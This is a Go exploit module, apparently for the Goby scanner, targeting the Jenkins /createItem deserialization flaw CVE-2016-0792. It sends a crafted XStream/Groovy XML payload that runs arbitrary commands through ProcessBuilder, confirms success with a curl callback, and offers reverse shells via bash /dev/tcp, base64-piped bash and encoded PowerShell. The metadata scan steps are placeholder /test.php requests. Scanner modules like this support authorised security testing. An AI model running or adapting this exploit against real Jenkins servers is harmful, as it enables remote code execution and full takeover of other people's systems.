package exploits

import (
	"encoding/base64"
	"errors"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"regexp"
	"strings"
	"time"
	"unicode/utf16"
)

func init() {
	expJson := `{
    "Name": "Jenkins /createItem Code Execution Vulnerability(CVE-2016-0792)",
    "Description": "<p>CloudBees Jenkins CI is a set of Java-based continuous integration tools developed by CloudBees in United States, which is mainly used to monitor continuous software release/test projects and some scheduled tasks. LTS is a long-term support release of CloudBees Jenkins CI. </p><p>CloudBees Jenkins CI and LTS have a security vulnerability that allows an attacker to execute arbitrary code by sending a specially crafted XML file to an API endpoint.</p>",
    "Product": "Jenkins",
    "Homepage": "https://www.jenkins.io/",
    "DisclosureDate": "2016-04-08",
    "PostTime": "2024-07-30",
    "Author": "202205566302@smail.xtu.edu.cn",
    "FofaQuery": "title=\"Jenkins\" && body=\"hudson-behavior.js\"",
    "GobyQuery": "title=\"Jenkins\" && body=\"hudson-behavior.js\"",
    "Level": "2",
    "Impact": "<p>Allows an attacker to execute arbitrary code by sending a specially crafted XML file to an API endpoint.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.jenkins.io/\">https://www.jenkins.io/</a></p>",
    "References": [
        "https://avd.aliyun.com/detail?id=AVD-2016-0792"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "reverse,cmd",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        },
        {
            "name": "reverse",
            "type": "select",
            "value": "ByBashBase64,ByPowershellBase64",
            "show": "attackType=reverse"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Code Execution",
        "2H1W"
    ],
    "VulType": [
        "Code Execution"
    ],
    "CVEIDs": [
        "CVE-2016-0792"
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.8",
    "Translation": {
        "CN": {
            "Name": "Jenkins /createItem 反序列化代码执行漏洞（CVE-2016-0792）",
            "Product": "Jenkins",
            "Description": "<p>CloudBees Jenkins CI是美国CloudBees公司的一套基于Java开发的持续集成工具，它主要用于监控持续的软件版本发布/测试项目和一些定时执行的任务。LTS是CloudBees Jenkins CI的一个长期支持版本。</p><p>CloudBees Jenkins CI和LTS存在安全漏洞，允许攻击者可通过向API端点发送特制的XML文件执行任意代码。<br></p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.jenkins.io/\">https://www.jenkins.io/</a><br></p>",
            "Impact": "<p>允许攻击者可通过向API端点发送特制的XML文件执行任意代码。<br></p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "Jenkins /createItem Code Execution Vulnerability(CVE-2016-0792)",
            "Product": "Jenkins",
            "Description": "<p>CloudBees Jenkins CI is a set of Java-based continuous integration tools developed by CloudBees in United States, which is mainly used to monitor continuous software release/test projects and some scheduled tasks. LTS is a long-term support release of CloudBees Jenkins CI.&nbsp;</p><p>CloudBees Jenkins CI and LTS have a security vulnerability that allows an attacker to execute arbitrary code by sending a specially crafted XML file to an API endpoint.<br></p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:&nbsp;<a href=\"https://www.jenkins.io/\">https://www.jenkins.io/</a><br></p>",
            "Impact": "<p>Allows an attacker to execute arbitrary code by sending a specially crafted XML file to an API endpoint.<br></p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution",
                "2H1W"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "10984"
}`
	setPayloadRequestHashasjdfhqwybfyuqbfyqgywbf36gqgfbyhg := func(hostInfo *httpclient.FixUrl, command string) (ok bool, vulURL string, err error) {
		//请注意：command字段是原始的命令，如果漏洞利用需要对命令进行编码，则需在此处编码
		command = strings.ReplaceAll(command, "&", "&amp;")
		command = strings.ReplaceAll(command, "<", "&lt;")
		command = strings.ReplaceAll(command, ">", "&gt;")
		command = strings.ReplaceAll(command, "\"", "&quot;")
		command = strings.ReplaceAll(command, "'", "&apos;")
		//将指令根据空格拆分
		commandArr := strings.Split(command, " ")
		vulURL = "/createItem?name=foo"
		makeRequest := httpclient.NewPostRequestConfig(vulURL)
		makeRequest.VerifyTls = false
		makeRequest.Timeout = 10
		makeRequest.FollowRedirect = false
		makeRequest.Header.Store("Content-Type", "text/xml")
		// 假设 commandArr 是一个包含指令的字符串切片，xml_data 是一个字符串变量
		payload := ""
		for _, command := range commandArr {
			payload += `<string>` + command + "</string>\n" // 将每个指令加入到 xml_data 中
		}
		xml_data := `<map>
  <entry>
    <groovy.util.Expando>
      <expandoProperties>
        <entry>
          <string>hashCode</string>
          <org.codehaus.groovy.runtime.MethodClosure>
            <delegate class="java.lang.ProcessBuilder">
              <command>
              ` + payload + `
              </command>
              <redirectErrorStream>false</redirectErrorStream>
            </delegate>
            <owner class="java.lang.ProcessBuilder" reference="../delegate"/>
            <resolveStrategy>0</resolveStrategy>
            <directive>0</directive>
            <parameterTypes/>
            <maximumNumberOfParameters>0</maximumNumberOfParameters>
            <method>start</method>
          </org.codehaus.groovy.runtime.MethodClosure>
        </entry>
      </expandoProperties>
    </groovy.util.Expando>
    <int>123</int>
  </entry>
</map>`
		//请注意：ok值为，true代表命令执行成功，false代表命令执行失败
		makeRequest.Data = xml_data
		if resp, err := httpclient.DoHttpRequest(hostInfo, makeRequest); err == nil {
			if resp.StatusCode == 500 {
				ok = true
				return ok, vulURL, nil
			}
		}
		ok = false
		//请注意：vulURL 字段为检测后显示的风险路径，示例值为：/path/to/vulable.jsp
		return ok, vulURL, err
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			//请注意：在此处将setPayloadRequestHash0001函数赋值给runPayload
			runPayload := setPayloadRequestHashasjdfhqwybfyuqbfyqgywbf36gqgfbyhg

			//请注意：后续代码为模板代码，非特殊情况，无需更改
			checkStr := goutils.RandomHexString(6)
			checkUrl, _ := godclient.GetGodCheckURL(checkStr)

			//请注意：若漏洞环境特殊，可自行修改为wget、或其他能够出发HTTPLog的命令，由于部分godserver没有域名，所以尽量使用HTTPLog的方式
			pocCommand := "curl " + checkUrl
			ok, vulUrl, err := runPayload(hostInfo, pocCommand)
			if err != nil || !ok {
				return false
			}
			if godclient.PullExists(checkStr, time.Second*15) {
				ss.VulURL = hostInfo.FixedHostInfo + vulUrl
				return true
			}

			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			//请注意：在此处将setPayloadRequestHash0001函数赋值给runPayload
			runPayload := setPayloadRequestHashasjdfhqwybfyuqbfyqgywbf36gqgfbyhg

			//请注意：后续代码为模板代码，非特殊情况，无需更改
			setReverseWaitting := func(expResult *jsonvul.ExploitResult, waitSessionCh chan string) {
				select {
				case webConsleID := <-waitSessionCh:
					if u, err := url.Parse(webConsleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					} else {
						expResult.Success = false
						expResult.Output = "reverse shell fail"
					}
				case <-time.After(time.Second * 25):
				}
			}

			setReverseRequest := func(reverseType string) (string, chan string, error) {
				typeList := map[string]func(string) string{
					"ByBash":             godclient.ReverseTCPByBash,
					"ByBashBase64":       godclient.ReverseTCPByBash,
					"ByPowershell":       godclient.ReverseTCPByPowershell,
					"ByPowershellBase64": godclient.ReverseTCPByPowershell,
					"BySh":               godclient.ReverseTCPBySh,
					"ByNcBsd":            godclient.ReverseTCPByNcBsd,
				}
				if revserTypeNew := typeList[reverseType]; revserTypeNew == nil {
					return "", nil, errors.New("vaild exsploit")
				}
				waitSessionCh := make(chan string)

				if strings.Contains(reverseType, "ByPowershell") {
					if rp, err := godclient.WaitSession("reverse_windows", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByPowershellBase64" {
							utf16Bytes := utf16.Encode([]rune(strings.TrimLeft(command, "powershell ")))
							bytes := make([]byte, len(utf16Bytes)*2)
							for i, v := range utf16Bytes {
								bytes[i*2] = byte(v)
								bytes[i*2+1] = byte(v >> 8)
							}
							command = "powershell -e " + base64.StdEncoding.EncodeToString(bytes)
						}
						return command, waitSessionCh, nil
					}
				} else {
					if rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByBash" {
							reRequest := regexp.MustCompile("(/dev/tcp/((.|\n)*?)/[0-9]+)")
							getserver := reRequest.FindStringSubmatch(command)
							command = "/bin/bash -c bash${IFS}-i${IFS}>&" + getserver[1] + "<&1"
						}
						if reverseType == "ByBashBase64" {
							command = "bash -c {echo," + base64.StdEncoding.EncodeToString([]byte(command)) + "}|{base64,-d}|{bash,-i}"
						}
						return command, waitSessionCh, nil
					}
				}
				return "", waitSessionCh, errors.New("gain command fail")
			}

			attackType := goutils.B2S(ss.Params["attackType"])
			switch attackType {
			case "cmd":
				//配置命令
				command := goutils.B2S(ss.Params["cmd"])
				ok, _, err := runPayload(expResult.HostInfo, command)
				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}
				if !ok {
					expResult.Success = false
					expResult.Output = "执行失败"
				}
				expResult.Success = true
				expResult.Output = "执行成功,该漏洞无回显,请自行判断执行效果"
			case "reverse":
				//配置反弹shell的类型
				reversetype := goutils.B2S(ss.Params["reverse"])
				if command, waitSessionCh, err := setReverseRequest(reversetype); command != "" {
					go runPayload(expResult.HostInfo, command)
					setReverseWaitting(expResult, waitSessionCh)
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			default:
				expResult.Success = false
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
